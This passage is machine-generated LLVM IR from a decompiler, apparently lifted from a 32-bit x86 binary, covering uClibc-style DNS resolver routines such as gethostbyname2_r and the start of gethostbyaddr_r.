  store i32 -1, i32* %v1_805e56d, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e80c

dec_label_pc_805e794:                             ; preds = %dec_label_pc_805e6e2
  %v3_805e799.pre = load i32, i32* %stack_var_-76, align 4
  %v0_805e79d.pre = load i32, i32* @edi, align 4
  store i32 %v0_805e79d.pre, i32* %stack_var_-108, align 4
  %v3_805e79e = inttoptr i32 %v0_805e79d.pre to i8*
  %v4_805e79e = call i32 @strncpy(i8* %v3_805e79e, i32 %v3_805e799.pre, i32 %v1_805e5db)
  store i32 %v4_805e79e, i32* %eax.global-to-local, align 4
  %v2_805e7a3 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805e7a3, i32* @ecx, align 4
  %v3_805e7a4 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805e7a4, i32* %stack_var_-108, align 4
  %v1_805e7a8 = call i32 @free(i32 %v3_805e7a4)
  store i32 %v1_805e7a8, i32* %eax.global-to-local, align 4
  %v12_805e7b0 = icmp eq i32 %tmp10, 1
  %v1_805e7b5 = icmp eq i1 %v12_805e7b0, false
  br i1 %v1_805e7b5, label %dec_label_pc_805e811, label %dec_label_pc_805e7b7

dec_label_pc_805e7b7:                             ; preds = %dec_label_pc_805e794
  %v0_805e7b7 = load i32, i32* @edx, align 4
  %v0_805e7be = load i32, i32* @ebp, align 4
  store i32 %v0_805e7be, i32* %stack_var_-108, align 4
  %v3_805e7bf = inttoptr i32 %tmp to i16*
  %v4_805e7bf = call i32 @memcpy(i16* %v3_805e7bf, i32 4, i32 %v0_805e7b7)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_805e7c8 = load i32, i32* @edi, align 4
  store i32 %v0_805e7c8, i32* %arg2, align 4
  %v1_805e7ca = add i32 %tmp18, 8
  %v2_805e7ca = inttoptr i32 %v1_805e7ca to i32*
  store i32 2, i32* %v2_805e7ca, align 4
  %v0_805e7d1 = load i32, i32* %eax.global-to-local, align 4
  %v1_805e7d1 = add i32 %v0_805e7d1, 12
  %v2_805e7d1 = inttoptr i32 %v1_805e7d1 to i32*
  store i32 4, i32* %v2_805e7d1, align 4
  %v3_805e7d8 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_805e7d8, i32* %edx.global-to-local, align 4
  %v1_805e7dc = load i32, i32* %eax.global-to-local, align 4
  %v2_805e7dc = add i32 %v1_805e7dc, 16
  %v3_805e7dc = inttoptr i32 %v2_805e7dc to i32*
  store i32 %v3_805e7d8, i32* %v3_805e7dc, align 4
  store i32 %v1_805e5ee, i32* @ecx, align 4
  %v1_805e7e3 = load i32, i32* %eax.global-to-local, align 4
  %v2_805e7e3 = add i32 %v1_805e7e3, 4
  %v3_805e7e3 = inttoptr i32 %v2_805e7e3 to i32*
  store i32 %v1_805e5ee, i32* %v3_805e7e3, align 4
  %v2_805e7e6 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805e7e6, i32* %eax.global-to-local, align 4
  %v3_805e7e7 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e7e7, i32* %stack_var_-108, align 4
  %v1_805e7eb = call i32 @free(i32 %v3_805e7e7)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_805e51f, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* @ecx, align 4
  store i32 0, i32* %v1_805e56d, align 4
  br label %dec_label_pc_805e80c

dec_label_pc_805e80c:                             ; preds = %dec_label_pc_805e811, %dec_label_pc_805e6fb, %dec_label_pc_805e7b7
  br label %dec_label_pc_805e836

dec_label_pc_805e811:                             ; preds = %dec_label_pc_805e794
  %v3_805e814 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805e814, i32* %stack_var_-108, align 4
  %v1_805e818 = call i32 @free(i32 %v3_805e814)
  store i32 1, i32* %v1_805e56d, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e80c

dec_label_pc_805e831:                             ; preds = %dec_label_pc_805e5db, %dec_label_pc_805e5bf, %dec_label_pc_805e5b3, %dec_label_pc_805e5a0, %dec_label_pc_805e594
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e836

dec_label_pc_805e836:                             ; preds = %dec_label_pc_805e580, %dec_label_pc_805e579, %dec_label_pc_805e535, %entry, %dec_label_pc_805e80c, %dec_label_pc_805e6ce, %dec_label_pc_805e628, %dec_label_pc_805e831
  store i32 %v0_805e50f, i32* @ebx, align 4
  store i32 %v0_805e50e, i32* @esi, align 4
  store i32 %v0_805e50d, i32* @edi, align 4
  store i32 %v0_805e50c, i32* @ebp, align 4
  %v0_805e83d = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805e83d

; uselistorder directives
  uselistorder i32 %v1_805e5f1, { 1, 0, 2 }
  uselistorder i32 %v1_805e5ee, { 2, 1, 0 }
  uselistorder i32 %v1_805e5db, { 2, 4, 1, 3, 0, 5 }
  uselistorder i32 %v0_805e5a4.pre, { 0, 2, 1 }
  uselistorder i32 %v1_805e58f, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_805e56d, { 2, 0, 1, 3 }
  uselistorder i32* %v1_805e56d, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_805e51f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-108, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 30, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31 }
  uselistorder i32 (i8*, i32)* @inet_aton, { 1, 2, 0 }
  uselistorder i32 %arg6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 2, 0, 1 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805e836, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805e80c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805e5a0, { 1, 0 }
}

define i32 @gethostbyname2_r() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %v0_805e840 = load i32, i32* @ebp, align 4
  %v0_805e841 = load i32, i32* @edi, align 4
  %v0_805e842 = load i32, i32* @esi, align 4
  %v0_805e843 = load i32, i32* @ebx, align 4
  store i32 %tmp15, i32* %eax.global-to-local, align 4
  store i32 %tmp13, i32* @esi, align 4
  %v9_805e856 = icmp eq i32 %tmp15, 2
  %v1_805e859 = icmp eq i1 %v9_805e856, false
  br i1 %v1_805e859, label %dec_label_pc_805e888, label %dec_label_pc_805e85b

dec_label_pc_805e85b:                             ; preds = %entry
  store i32 %tmp11, i32* %stack_var_-124, align 4
  store i32 %tmp9, i32* %stack_var_-140, align 4
  %v7_805e87b = inttoptr i32 %tmp10 to i32*
  %v8_805e87b = call i32 @gethostbyname_r(i32 %tmp9, i32* %v7_805e87b, i32 %tmp13, i32 %tmp11, i32 %tmp12, i32 %tmp15, i32 %tmp15)
  store i32 %v8_805e87b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805eb67

dec_label_pc_805e888:                             ; preds = %entry
  %v9_805e888 = icmp eq i32 %tmp15, 10
  %v1_805e88b = icmp eq i1 %v9_805e888, false
  br i1 %v1_805e88b, label %dec_label_pc_805eb35, label %dec_label_pc_805e891

dec_label_pc_805e891:                             ; preds = %dec_label_pc_805e888
  %v3_805e891 = call i32 @__open_nameservers(i32 %v0_805e843, i32 %v0_805e842, i32 %v0_805e841)
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_805e89d = inttoptr i32 %tmp11 to i32*
  store i32 0, i32* %v1_805e89d, align 4
  %v4_805e8a3 = icmp eq i32 %tmp9, 0
  br i1 %v4_805e8a3, label %dec_label_pc_805eb35, label %dec_label_pc_805e8ae

dec_label_pc_805e8ae:                             ; preds = %dec_label_pc_805e891
  %v0_805e8ae = load i32, i32* %stack_var_-140, align 4
  %v1_805e8ae = call i32 @__errno_location(i32 %v0_805e8ae)
  store i32 %v1_805e8ae, i32* %eax.global-to-local, align 4
  store i32 %v1_805e8ae, i32* @ebx, align 4
  %v1_805e8b5 = inttoptr i32 %v1_805e8ae to i32*
  %v2_805e8b5 = load i32, i32* %v1_805e8b5, align 4
  store i32 %v2_805e8b5, i32* @edi, align 4
  store i32 0, i32* %v1_805e8b5, align 4
  %v0_805e8cc = load i32, i32* @esi, align 4
  store i32 %v0_805e8cc, i32* %stack_var_-124, align 4
  store i32 %tmp9, i32* %stack_var_-140, align 4
  %v7_805e8de = call i32 @__get_hosts_byname_r(i32 %tmp9, i32 10, i32 %tmp10, i32 %v0_805e8cc, i32 %tmp11, i32 %tmp12, i32 %v1_805e8ae)
  store i32 %v7_805e8de, i32* %eax.global-to-local, align 4
  %v1_805e8e6 = icmp eq i32 %v7_805e8de, 0
  br i1 %v1_805e8e6, label %dec_label_pc_805eb67, label %dec_label_pc_805e8ee

dec_label_pc_805e8ee:                             ; preds = %dec_label_pc_805e8ae
  store i32 %tmp12, i32* @ecx, align 4
  %v1_805e8f5 = inttoptr i32 %tmp12 to i32*
  %v2_805e8f5 = load i32, i32* %v1_805e8f5, align 4
  store i32 %v2_805e8f5, i32* %edx.global-to-local, align 4
  %v9_805e8f7 = icmp eq i32 %v2_805e8f5, 1
  br i1 %v9_805e8f7, label %dec_label_pc_805e90a, label %dec_label_pc_805e8fc

dec_label_pc_805e8fc:                             ; preds = %dec_label_pc_805e8ee
  %v9_805e8fc = icmp eq i32 %v2_805e8f5, 4
  br i1 %v9_805e8fc, label %dec_label_pc_805e92a, label %dec_label_pc_805e901

dec_label_pc_805e901:                             ; preds = %dec_label_pc_805e8fc
  %v1_805e901 = add i32 %v2_805e8f5, 1
  %v8_805e901 = icmp eq i32 %v1_805e901, 0
  store i32 %v1_805e901, i32* %edx.global-to-local, align 4
  %v1_805e902 = icmp eq i1 %v8_805e901, false
  br i1 %v1_805e902, label %dec_label_pc_805eb67, label %dec_label_pc_805e919

dec_label_pc_805e90a:                             ; preds = %dec_label_pc_805e8ee
  %v9_805e90a = icmp eq i32 %v7_805e8de, 2
  %v1_805e90d = zext i1 %v9_805e90a to i32
  store i32 %v1_805e90d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805e92a

dec_label_pc_805e919:                             ; preds = %dec_label_pc_805e901
  %v0_805e919 = load i32, i32* @ebx, align 4
  %v1_805e919 = inttoptr i32 %v0_805e919 to i32*
  %v2_805e919 = load i32, i32* %v1_805e919, align 4
  %v11_805e919 = icmp eq i32 %v2_805e919, 2
  %v1_805e91c = icmp eq i1 %v11_805e919, false
  br i1 %v1_805e91c, label %dec_label_pc_805eb67, label %dec_label_pc_805e92a

dec_label_pc_805e92a:                             ; preds = %dec_label_pc_805e8fc, %dec_label_pc_805e919, %dec_label_pc_805e90a
  %storemerge = phi i32 [ %v1_805e90d, %dec_label_pc_805e90a ], [ 0, %dec_label_pc_805e919 ], [ 0, %dec_label_pc_805e8fc ]
  %v0_805e92a = load i32, i32* @edi, align 4
  %v1_805e92a = load i32, i32* @ebx, align 4
  %v2_805e92a = inttoptr i32 %v1_805e92a to i32*
  store i32 %v0_805e92a, i32* %v2_805e92a, align 4
  %v0_805e92c = load i32, i32* @esi, align 4
  store i32 %tmp12, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_805e8f5, align 4
  %tmp33 = icmp ult i32 %v0_805e92c, 16
  br i1 %tmp33, label %dec_label_pc_805eb62, label %dec_label_pc_805e942

dec_label_pc_805e942:                             ; preds = %dec_label_pc_805e92a
  %v0_805e942 = load i32, i32* @esi, align 4
  %v1_805e942 = add i32 %v0_805e942, -16
  store i32 %v1_805e942, i32* %eax.global-to-local, align 4
  %tmp34 = icmp ult i32 %v1_805e942, 8
  br i1 %tmp34, label %dec_label_pc_805eb62, label %dec_label_pc_805e94e

dec_label_pc_805e94e:                             ; preds = %dec_label_pc_805e942
  store i32 %tmp10, i32* @ecx, align 4
  %v1_805e956 = add i32 %tmp10, 16
  store i32 %v1_805e956, i32* %edx.global-to-local, align 4
  %v1_805e959 = add i32 %v0_805e942, -24
  store i32 %v1_805e959, i32* @esi, align 4
  %v3_805e964 = inttoptr i32 %v1_805e956 to i32*
  store i32 %tmp10, i32* %v3_805e964, align 4
  %v0_805e967 = load i32, i32* %edx.global-to-local, align 4
  %v1_805e967 = add i32 %v0_805e967, 4
  %v2_805e967 = inttoptr i32 %v1_805e967 to i32*
  store i32 0, i32* %v2_805e967, align 4
  %tmp35 = icmp ult i32 %v1_805e959, 256
  br i1 %tmp35, label %dec_label_pc_805eb62, label %dec_label_pc_805e97c

dec_label_pc_805e97c:                             ; preds = %dec_label_pc_805e94e
  %v0_805e97d = load i32, i32* @ecx, align 4
  %v1_805e987 = add i32 %v0_805e97d, 24
  store i32 %v1_805e987, i32* @edi, align 4
  store i32 %v1_805e987, i32* %stack_var_-124, align 4
  %v3_805e98b = inttoptr i32 %v1_805e987 to i8*
  %v4_805e98b = call i32 @strncpy(i8* %v3_805e98b, i32 %tmp9, i32 %v1_805e959)
  store i32 %v4_805e98b, i32* %eax.global-to-local, align 4
  store i32 10, i32* %stack_var_-124, align 4
  %v3_805e9a0 = inttoptr i32 %tmp9 to i8*
  %v4_805e9a0 = call i32 @inet_pton(i32 10, i8* %v3_805e9a0, i32 %tmp10)
  store i32 %v4_805e9a0, i32* %eax.global-to-local, align 4
  %v1_805e9a8 = icmp eq i32 %v4_805e9a0, 0
  br i1 %v1_805e9a8, label %dec_label_pc_805e9e1, label %dec_label_pc_805e9ac

dec_label_pc_805e9ac:                             ; preds = %dec_label_pc_805e97c
  %v0_805e9ac = load i32, i32* @edi, align 4
  %v1_805e9ac = load i32, i32* @ebp, align 4
  %v2_805e9ac = inttoptr i32 %v1_805e9ac to i32*
  store i32 %v0_805e9ac, i32* %v2_805e9ac, align 4
  %v0_805e9af = load i32, i32* @ebp, align 4
  %v1_805e9af = add i32 %v0_805e9af, 8
  %v2_805e9af = inttoptr i32 %v1_805e9af to i32*
  store i32 10, i32* %v2_805e9af, align 4
  %v0_805e9b6 = load i32, i32* @ebp, align 4
  %v1_805e9b6 = add i32 %v0_805e9b6, 12
  %v2_805e9b6 = inttoptr i32 %v1_805e9b6 to i32*
  store i32 16, i32* %v2_805e9b6, align 4
  %v1_805e9c1 = load i32, i32* @ebp, align 4
  %v2_805e9c1 = add i32 %v1_805e9c1, 16
  %v3_805e9c1 = inttoptr i32 %v2_805e9c1 to i32*
  store i32 %v1_805e956, i32* %v3_805e9c1, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v0_805e9cd = load i32, i32* @ebp, align 4
  store i32 %v0_805e9cd, i32* %v1_805e89d, align 4
  store i32 %tmp12, i32* @ecx, align 4
  store i32 0, i32* %v1_805e8f5, align 4
  br label %dec_label_pc_805eb67

dec_label_pc_805e9e1:                             ; preds = %dec_label_pc_805e97c
  %v4_805e9e1 = icmp eq i32 %storemerge, 0
  %v1_805e9e6 = icmp eq i1 %v4_805e9e1, false
  br i1 %v1_805e9e6, label %dec_label_pc_805eb3c, label %dec_label_pc_805e9ec

dec_label_pc_805e9ec:                             ; preds = %dec_label_pc_805e9e1
  %v2_805e9f1 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_805e9f1, i32* %eax.global-to-local, align 4
  store i32 %v2_805e9f1, i32* %stack_var_-124, align 4
  %v3_805e9f6 = bitcast i32* %stack_var_-76 to i8*
  %v4_805e9f6 = call i32 @__GI_memset(i8* %v3_805e9f6, i32 0, i32 40)
  store i32 %v4_805e9f6, i32* %eax.global-to-local, align 4
  %v2_805ea11 = ptrtoint i32* %stack_var_-36 to i32
  %v2_805ea3e = ptrtoint i32* %stack_var_-20 to i32
  %v9_805ea7c = icmp eq i32 %tmp4, 5
  %v1_805ea7f = icmp eq i1 %v9_805ea7c, false
  br label %dec_label_pc_805ea06

dec_label_pc_805ea06:                             ; preds = %dec_label_pc_805eaaa, %dec_label_pc_805e9ec
  %stack_var_-96.0 = phi i32 [ 0, %dec_label_pc_805e9ec ], [ %v4_805eaaa, %dec_label_pc_805eaaa ]
  store i32 %v2_805ea11, i32* @ebx, align 4
  store i32 %v2_805ea11, i32* %stack_var_-124, align 4
  %v4_805ea16 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-36, i32 134585853, i32 ptrtoint (i32* @global_var_80748a0.725 to i32))
  store i32 %v4_805ea16, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80748a0.725 to i32), i32* %stack_var_-124, align 4
  %v1_805ea22 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_80748a0.725 to i32))
  %v2_805ea27 = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805ea27, i32* @ecx, align 4
  store i32 134585853, i32* %eax.global-to-local, align 4
  store i32 %v2_805ea11, i32* %stack_var_-124, align 4
  %v3_805ea32 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-36, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  store i32 %v2_805ea3e, i32* %eax.global-to-local, align 4
  store i32 %v2_805ea3e, i32* %stack_var_-124, align 4
  %v0_805ea48 = load i32, i32* @esi, align 4
  %v0_805ea4b = load i32, i32* @edi, align 4
  store i32 %v0_805ea4b, i32* %stack_var_-140, align 4
  %v6_805ea4c = inttoptr i32 %v0_805ea4b to i8*
  %v7_805ea4c = call i32 @__dns_lookup(i8* %v6_805ea4c, i32 28, i32 %v0_805ea48, i32 ptrtoint (i32* @global_var_807ea54.727 to i32), i32 %v2_805ea3e, i32 %v2_805e9f1)
  store i32 %v7_805ea4c, i32* %eax.global-to-local, align 4
  %v2_805ea54 = icmp slt i32 %v7_805ea4c, 0
  br i1 %v2_805ea54, label %dec_label_pc_805eb3c, label %dec_label_pc_805ea5c

dec_label_pc_805ea5c:                             ; preds = %dec_label_pc_805ea06
  %v3_805ea61 = load i32, i32* %stack_var_-76, align 4
  %v0_805ea65 = load i32, i32* @edi, align 4
  store i32 %v0_805ea65, i32* %stack_var_-124, align 4
  %v3_805ea66 = inttoptr i32 %v0_805ea65 to i8*
  %v4_805ea66 = call i32 @strncpy(i8* %v3_805ea66, i32 %v3_805ea61, i32 %v1_805e959)
  store i32 %v4_805ea66, i32* %eax.global-to-local, align 4
  %v2_805ea6b = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805ea6b, i32* @ebx, align 4
  %v3_805ea6c = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805ea6c, i32* %stack_var_-124, align 4
  %v1_805ea70 = call i32 @free(i32 %v3_805ea6c)
  store i32 %tmp4, i32* %eax.global-to-local, align 4
  br i1 %v1_805ea7f, label %dec_label_pc_805eabe, label %dec_label_pc_805ea81

dec_label_pc_805ea81:                             ; preds = %dec_label_pc_805ea5c
  %v0_805ea85 = load i32, i32* @edi, align 4
  %v3_805ea8a = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805ea8a, i32* %stack_var_-124, align 4
  %v4_805ea8e = call i32 @__decode_dotted(i32 %v3_805ea8a, i32 %tmp3, i32 %v0_805ea85, i32 %v1_805e959)
  store i32 %v4_805ea8e, i32* %eax.global-to-local, align 4
  %v2_805ea93 = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805ea93, i32* @ecx, align 4
  %v3_805ea94 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805ea94, i32* %stack_var_-124, align 4
  store i32 %v4_805ea8e, i32* @ebx, align 4
  %v1_805ea9a = call i32 @free(i32 %v3_805ea94)
  store i32 %v1_805ea9a, i32* %eax.global-to-local, align 4
  %v2_805eaa2 = icmp slt i32 %v4_805ea8e, 0
  br i1 %v2_805eaa2, label %dec_label_pc_805eb50, label %dec_label_pc_805eaaa

dec_label_pc_805eaaa:                             ; preds = %dec_label_pc_805ea81
  %v4_805eaaa = add nuw nsw i32 %stack_var_-96.0, 1
  %v7_805eab3 = icmp sgt i32 %stack_var_-96.0, 4
  br i1 %v7_805eab3, label %dec_label_pc_805eb50, label %dec_label_pc_805ea06

dec_label_pc_805eabe:                             ; preds = %dec_label_pc_805ea5c
  %v9_805eabe = icmp eq i32 %tmp4, 28
  %v1_805eac1 = icmp eq i1 %v9_805eabe, false
  br i1 %v1_805eac1, label %dec_label_pc_805eb12, label %dec_label_pc_805eac3

dec_label_pc_805eac3:                             ; preds = %dec_label_pc_805eabe
  store i32 %tmp10, i32* %stack_var_-124, align 4
  %v3_805ead1 = inttoptr i32 %tmp10 to i16*
  %v4_805ead1 = call i32 @memcpy(i16* %v3_805ead1, i32 %tmp, i32 16)
  %v0_805ead6 = load i32, i32* @edi, align 4
  %v1_805ead6 = load i32, i32* @ebp, align 4
  %v2_805ead6 = inttoptr i32 %v1_805ead6 to i32*
  store i32 %v0_805ead6, i32* %v2_805ead6, align 4
  %v0_805ead9 = load i32, i32* @ebp, align 4
  %v1_805ead9 = add i32 %v0_805ead9, 8
  %v2_805ead9 = inttoptr i32 %v1_805ead9 to i32*
  store i32 10, i32* %v2_805ead9, align 4
  %v0_805eae0 = load i32, i32* @ebp, align 4
  %v1_805eae0 = add i32 %v0_805eae0, 12
  %v2_805eae0 = inttoptr i32 %v1_805eae0 to i32*
  store i32 16, i32* %v2_805eae0, align 4
  store i32 %v1_805e956, i32* @ecx, align 4
  %v1_805eaeb = load i32, i32* @ebp, align 4
  %v2_805eaeb = add i32 %v1_805eaeb, 16
  %v3_805eaeb = inttoptr i32 %v2_805eaeb to i32*
  store i32 %v1_805e956, i32* %v3_805eaeb, align 4
  %v2_805eaee = load i32, i32* %stack_var_-124, align 4
  store i32 %v2_805eaee, i32* %eax.global-to-local, align 4
  %v3_805eaef = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805eaef, i32* %stack_var_-124, align 4
  %v1_805eaf3 = call i32 @free(i32 %v3_805eaef)
  %v0_805eaff = load i32, i32* @ebp, align 4
  store i32 %v0_805eaff, i32* %v1_805e89d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %tmp12, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805eb30

dec_label_pc_805eb12:                             ; preds = %dec_label_pc_805eabe
  %v3_805eb15 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805eb15, i32* %stack_var_-124, align 4
  %v1_805eb19 = call i32 @free(i32 %v3_805eb15)
  store i32 %tmp12, i32* @ecx, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805eb30

dec_label_pc_805eb30:                             ; preds = %dec_label_pc_805eac3, %dec_label_pc_805eb12
  %storemerge1 = phi i32 [ 0, %dec_label_pc_805eac3 ], [ 1, %dec_label_pc_805eb12 ]
  store i32 %storemerge1, i32* %v1_805e8f5, align 4
  br label %dec_label_pc_805eb67

dec_label_pc_805eb35:                             ; preds = %dec_label_pc_805e891, %dec_label_pc_805e888
  store i32 22, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805eb67

dec_label_pc_805eb3c:                             ; preds = %dec_label_pc_805ea06, %dec_label_pc_805e9e1
  store i32 1, i32* %v1_805e8f5, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805eb67

dec_label_pc_805eb50:                             ; preds = %dec_label_pc_805eaaa, %dec_label_pc_805ea81
  store i32 %tmp12, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 3, i32* %v1_805e8f5, align 4
  br label %dec_label_pc_805eb67

dec_label_pc_805eb62:                             ; preds = %dec_label_pc_805e94e, %dec_label_pc_805e942, %dec_label_pc_805e92a
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805eb67

dec_label_pc_805eb67:                             ; preds = %dec_label_pc_805e919, %dec_label_pc_805e901, %dec_label_pc_805e8ae, %dec_label_pc_805eb50, %dec_label_pc_805eb3c, %dec_label_pc_805eb35, %dec_label_pc_805eb30, %dec_label_pc_805e9ac, %dec_label_pc_805e85b, %dec_label_pc_805eb62
  store i32 %v0_805e843, i32* @ebx, align 4
  store i32 %v0_805e842, i32* @esi, align 4
  store i32 %v0_805e841, i32* @edi, align 4
  store i32 %v0_805e840, i32* @ebp, align 4
  %v0_805eb6e = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805eb6e

; uselistorder directives
  uselistorder i32 %v4_805ea8e, { 1, 0, 2 }
  uselistorder i32 %v1_805e959, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_805e956, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_805e8f5, { 2, 0, 1, 3 }
  uselistorder i32* %v1_805e8f5, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* %v1_805e89d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-76, { 1, 2, 0, 3 }
  uselistorder i32 %tmp15, { 0, 2, 3, 1, 4 }
  uselistorder i32 %tmp12, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp11, { 5, 0, 4, 3, 1, 2 }
  uselistorder i32 %tmp10, { 7, 6, 3, 0, 5, 4, 1, 2 }
  uselistorder i32 %tmp9, { 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %tmp4, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 26, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 28 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_805eb67, { 9, 3, 4, 5, 6, 7, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_805eb30, { 1, 0 }
  uselistorder label %dec_label_pc_805e92a, { 1, 2, 0 }
}

define i32 @__GI_gethostbyaddr_r(i8* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = alloca i8*, align 4
  %tmp22 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp30 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-140 = alloca i8*, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-120 = alloca i8*, align 4
  %stack_var_-76 = alloca i32, align 4
  %v0_805eb70 = load i32, i32* @ebp, align 4
  %v0_805eb71 = load i32, i32* @edi, align 4
  %v0_805eb72 = load i32, i32* @esi, align 4
  store i32 %tmp35, i32* %eax.global-to-local, align 4
  %v4_805eb7e = ptrtoint i8* %arg1 to i32
  store i8* %arg1, i8** %tmp, align 4
  store i32 %v4_805eb7e, i32* @esi, align 4
  %v2_805eb90 = icmp eq i8* %arg1, null
  %v1_805eb92 = inttoptr i32 %tmp35 to i32*
  store i32 0, i32* %v1_805eb92, align 4
  br i1 %v2_805eb90, label %dec_label_pc_805eeaa, label %dec_label_pc_805eb9e

dec_label_pc_805eb9e:                             ; preds = %entry
  %v2_805eb9e = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_805eb9e, i32* %eax.global-to-local, align 4
  store i8* null, i8** %stack_var_-120, align 4
  store i32 %v2_805eb9e, i32* %stack_var_-124, align 4
  %v4_805eba8 = bitcast i32* %stack_var_-76 to i8*
  %v5_805eba8 = call i32 @__GI_memset(i8* %v4_805eba8, i32 0, i32 40)
  store i32 %v5_805eba8, i32* %eax.global-to-local, align 4
  %v12_805ebb0 = icmp eq i32 %tmp31, 2
  br i1 %v12_805ebb0, label %dec_label_pc_805ebc4, label %dec_label_pc_805ebb7

dec_label_pc_805ebb7:                             ; preds = %dec_label_pc_805eb9e
  %v12_805ebb7 = icmp eq i32 %tmp31, 10
  %v1_805ebbc = icmp eq i1 %v12_805ebb7, false
  br i1 %v1_805ebbc, label %dec_label_pc_805eeaa, label %dec_label_pc_805ebcb

dec_label_pc_805ebc4:                             ; preds = %dec_label_pc_805eb9e
  %v4_805ebc4 = add i32 %tmp30, -4
  br label %dec_label_pc_805ebd0

dec_label_pc_805ebcb:                             ; preds = %dec_label_pc_805ebb7
  %v4_805ebcb = add i32 %tmp30, -16
  br label %dec_label_pc_805ebd0

